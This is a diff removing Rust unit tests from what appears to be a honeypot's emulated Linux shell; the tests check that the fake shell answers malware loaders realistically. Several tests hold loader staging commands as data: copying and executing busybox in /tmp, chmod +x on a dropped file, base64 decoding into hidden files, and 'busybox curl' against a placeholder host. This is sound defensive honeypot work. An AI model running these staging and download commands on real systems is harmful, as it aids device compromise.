-    fn uname_single_fields_are_selected_individually() {
-        assert_eq!(
-            cmd_uname(&["uname", "-s"], crate::shell::ShellFlavor::Bash),
-            "Linux\n"
-        );
-        assert_eq!(
-            cmd_uname(&["uname", "-r"], crate::shell::ShellFlavor::Bash),
-            "5.15.0-91-generic\n"
-        );
-        assert_eq!(
-            cmd_uname(&["uname", "-n"], crate::shell::ShellFlavor::Bash),
-            "server01\n"
-        );
-    }
-
-    #[test]
-    fn uname_combined_flags_print_fields_in_canonical_order() {
-        // Multiple flags print the selected fields in coreutils' fixed order regardless of the flag
-        // order given.
-        assert_eq!(
-            cmd_uname(&["uname", "-sr"], crate::shell::ShellFlavor::Bash),
-            "Linux 5.15.0-91-generic\n"
-        );
-        assert_eq!(
-            cmd_uname(&["uname", "-rs"], crate::shell::ShellFlavor::Bash),
-            "Linux 5.15.0-91-generic\n"
-        );
-        assert_eq!(
-            cmd_uname(&["uname", "-s", "-r"], crate::shell::ShellFlavor::Bash),
-            "Linux 5.15.0-91-generic\n"
-        );
-    }
-
-    #[test]
-    fn uname_a_and_bare_keep_their_historical_output() {
-        // Regression guard: the forms that were already correct must not change.
-        assert_eq!(
-            cmd_uname(&["uname", "-a"], crate::shell::ShellFlavor::Bash),
-            "Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux\n"
-        );
-        assert_eq!(
-            cmd_uname(&["uname"], crate::shell::ShellFlavor::Bash),
-            "Linux\n"
-        );
-    }
-
-    #[test]
-    fn chmod_and_drop_chain_verbs_never_say_command_not_found() {
-        // `chmod +x x` returning "command not found" is impossible on real Linux and aborts the
-        // loader before it runs its payload - the most direct capture-costing tell in the shell.
-        let (out, _) = shell().handle_input("chmod +x /tmp/x");
-        assert_eq!(out, "");
-        // The rest answer as the real commands do: silence on success, the real message on a
-        // path that is not there. They used to be silent either way, which is how a loader
-        // could `cp` a payload and then not find it.
-        for cmd in ["cp /bin/busybox b", "mkdir d", "sleep 1", "rm -f x"] {
-            let (o, _) = shell().handle_input(cmd);
-            assert_eq!(o, "", "{cmd} should be a silent success, got {o:?}");
-        }
-        for (cmd, expected) in [
-            ("cp a b", "cp: cannot stat 'a': No such file or directory\n"),
-            ("rm x", "rm: cannot remove 'x': No such file or directory\n"),
-        ] {
-            let (o, _) = shell().handle_input(cmd);
-            assert_eq!(o, expected, "{cmd}");
-            assert!(!o.contains("command not found"));
-        }
-    }
-
-    /// `cp /bin/busybox x && ./x` is a standard staging step; it needs a busybox to copy.
-    #[test]
-    fn the_binaries_a_loader_copies_exist_and_are_executable() {
-        let mut sh = shell();
-        assert_eq!(sh.handle_input("cd /tmp").0, "");
-        assert_eq!(sh.handle_input("cp /bin/busybox ./b").0, "");
-        assert_eq!(sh.handle_input("./b").0, "", "the copy runs");
-        assert_eq!(sh.handle_input("ls /tmp").0, "b\n");
-    }
-
-    #[test]
-    fn busybox_chmod_dispatches_instead_of_applet_not_found() {
-        // The banner advertises chmod; `busybox chmod` must run it, not contradict the banner.
-        let (out, _) = shell().handle_input("busybox chmod +x x");
-        assert_eq!(out, "");
-    }
-
-    #[test]
-    fn busybox_banner_and_applet_set_never_contradict() {
-        // Both are derived from BUSYBOX_APPLETS, so every advertised applet is recognized and every
-        // recognized applet is advertised - the banner-vs-applet contradiction is impossible.
-        let banner = busybox_banner();
-        for applet in BUSYBOX_APPLETS {
-            assert!(
-                is_busybox_applet(applet),
-                "{applet} advertised but not recognized"
-            );
-            assert!(
-                banner.contains(applet),
-                "{applet} recognized but not advertised"
-            );
-        }
-        // curl is not a real BusyBox applet, so `busybox curl` is applet-not-found and it is absent
-        // from the banner.
-        assert!(!is_busybox_applet("curl"));
-        assert!(!banner.contains("curl"));
-        let (out, _) = shell().handle_input("busybox curl http://x/y");
-        assert!(out.contains("curl: applet not found"), "got: {out}");
-    }
-
-    #[test]
-    fn redirect_truncates_stdout_into_a_file() {
-        let mut sh = shell();
-        assert_eq!(sh.handle_input("cd /tmp").0, "");
-        assert_eq!(sh.handle_input("echo hi > /tmp/f").0, "");
-        assert_eq!(sh.handle_input("cat /tmp/f").0, "hi\n");
-        // A second `>` replaces the content rather than extending it.
-        assert_eq!(sh.handle_input("echo yo > /tmp/f").0, "");
-        assert_eq!(sh.handle_input("cat /tmp/f").0, "yo\n");
-        // A command that prints nothing still truncates, as the shell opens the file first.
-        assert_eq!(sh.handle_input("true > /tmp/f").0, "");
-        assert_eq!(sh.handle_input("cat /tmp/f").0, "");
-    }
-
-    #[test]
-    fn redirect_append_adds_to_existing() {
-        let mut sh = shell();
-        sh.handle_input("echo a > /tmp/f");
-        assert_eq!(sh.handle_input("echo b >> /tmp/f").0, "");
-        assert_eq!(sh.handle_input("cat /tmp/f").0, "a\nb\n");
-    }
-
-    #[test]
-    fn busybox_echo_redirect_writes_one_newline_and_prints_nothing() {
-        let mut sh = shell();
-        assert_eq!(sh.handle_input("/bin/busybox echo > /tmp/.fxcat").0, "");
-        assert_eq!(sh.handle_input("cat /tmp/.fxcat").0, "\n");
-        let r = sh.handle_input("sh /tmp/.fxcat").0;
-        assert_eq!(r, "");
-        assert_eq!(r.status, 0);
-    }
-
-    #[test]
-    fn sh_of_blank_or_comment_only_file_exits_zero_silently() {
-        let mut sh = shell();
-        sh.handle_input("echo > /tmp/blank");
-        assert_eq!(sh.handle_input("sh /tmp/blank").0, "");
-        sh.handle_input("echo '# just a comment' > /tmp/c");
-        let r = sh.handle_input("sh /tmp/c").0;
-        assert_eq!(r, "");
-        assert_eq!(r.status, 0);
-        assert!(super::is_blank_or_comment_only("\n"));
-        assert!(super::is_blank_or_comment_only(""));
-        assert!(super::is_blank_or_comment_only("   \n#x\n"));
-        assert!(!super::is_blank_or_comment_only("id\n"));
-    }
-
-    #[test]
-    fn sh_of_a_file_with_real_content_exits_zero_unparsed() {
-        let mut sh = shell();
-        sh.handle_input("echo id > /tmp/s");
-        let r = sh.handle_input("sh /tmp/s").0;
-        assert_eq!(r, "");
-        assert_eq!(r.status, 0);
-        assert!(!r.contains("uid=0"));
-    }
-
-    #[test]
-    fn sh_of_a_missing_file_gives_the_dash_open_error() {
-        let mut sh = shell();
-        let r = sh.handle_input("sh /tmp/nope").0;
-        assert_eq!(r, "sh: 0: cannot open /tmp/nope: No such file\n");
-        assert_eq!(r.status, 2);
-    }
-
-    #[test]
-    fn sh_dash_c_with_an_empty_script_is_not_a_file_open() {
-        let mut sh = shell();
-        let r = sh.handle_input("sh -c \"\"").0;
-        assert_eq!(r, "");
-        assert_eq!(r.status, 0);
-    }
-
-    #[test]
-    fn stderr_redirect_discards_via_dev_null_and_merges_via_2to1() {
-        let mut sh = shell();
-        sh.handle_input("cd /tmp");
-        assert_eq!(sh.handle_input("ls /missing_q 2>/dev/null").0, "");
-        assert_eq!(sh.handle_input("ls /missing_q 2>/dev/null").0.status, 2);
-        assert_eq!(sh.handle_input("ls /missing_q > /tmp/o 2>&1").0, "");
-        assert_eq!(
-            sh.handle_input("cat /tmp/o").0,
-            "ls: cannot access '/missing_q': No such file or directory\n"
-        );
-    }
-
-    #[test]
-    fn redirect_target_is_created_even_when_the_command_fails() {
-        let mut sh = shell();
-        sh.handle_input("cd /tmp");
-        assert_eq!(
-            sh.handle_input("cat /missing_q > /tmp/.bb").0,
-            "cat: /missing_q: No such file or directory\n"
-        );
-        assert_eq!(sh.handle_input("chmod 755 /tmp/.bb").0, "");
-        assert_eq!(sh.handle_input("/tmp/.bb").0, "");
-    }
-
-    #[test]
-    fn redirect_into_a_missing_directory_errors_and_blocks_the_command() {
-        let mut sh = shell();
-        let r = sh.handle_input("echo hi > /nope/f").0;
-        assert_eq!(r, "-bash: /nope/f: No such file or directory\n");
-        assert_eq!(r.status, 1);
-        assert!(sh.handle_input("ls /nope").0.contains("No such file"));
-    }
-
-    #[test]
-    fn word_attached_redirect_stays_a_literal_argument() {
-        use super::{Redirected, split_redirections};
-        let Redirected { argv, redirs } = split_redirections(&["cat", "i>ii"]);
-        assert_eq!(argv, vec!["cat", "i>ii"]);
-        assert!(redirs.is_empty());
-        let mut sh = shell();
-        sh.handle_input("cd /var");
-        assert_eq!(
-            sh.handle_input("cat i>ii").0,
-            "cat: i>ii: No such file or directory\n"
-        );
-    }
-
-    #[test]
-    fn pipeline_redirect_belongs_to_the_last_stage_and_is_ignored() {
-        let mut sh = shell();
-        assert!(
-            sh.handle_input("printf x | base64 -d > /tmp/.s")
-                .0
-                .contains("not found")
-        );
-        assert!(sh.handle_input("cat /tmp/.s").0.contains("No such file"));
-        assert_eq!(
-            super::first_pipeline_stage(&["id", "|", "grep", "uid"]),
-            &["id"]
-        );
-        assert_eq!(
-            super::first_pipeline_stage(&["cat", "/bin/ls|head", "-n", "1"]),
-            &["cat", "/bin/ls|head", "-n", "1"]
-        );
-    }
-
-    #[test]
-    fn split_redirections_classifies_every_form() {
-        use super::{RedirKind, split_redirections};
-        let r = split_redirections(&["echo", "a", ">", "f"]);
-        assert_eq!(r.argv, vec!["echo", "a"]);
-        assert_eq!(r.redirs.len(), 1);
-        assert!(matches!(
-            r.redirs[0].kind,
-            RedirKind::File {
-                target: "f",
-                append: false
-            }
-        ));
-        assert_eq!(
-            split_redirections(&["echo", ">>f"]).redirs[0].kind,
-            RedirKind::File {
-                target: "f",
-                append: true
-            }
-        );
-        let two = split_redirections(&["x", "2>e"]);
-        assert_eq!(two.redirs[0].fd, 2);
-        assert_eq!(
-            split_redirections(&["x", "2>&1"]).redirs[0].kind,
-            RedirKind::Dup(1)
-        );
-        assert_eq!(
-            split_redirections(&["x", "2>&-"]).redirs[0].kind,
-            RedirKind::Close
-        );
-        assert!(matches!(
-            split_redirections(&["x", ">/dev/null"]).redirs[0].kind,
-            RedirKind::File {
-                target: "/dev/null",
-                ..
-            }
-        ));
-        assert!(split_redirections(&["cat", "<in"]).redirs.is_empty());
-        assert_eq!(split_redirections(&["cat", "<in"]).argv, vec!["cat"]);
-        assert_eq!(
-            split_redirections(&["cat", "<", "in", "x"]).argv,
-            vec!["cat", "x"]
-        );
-    }
-}
+mod tests;
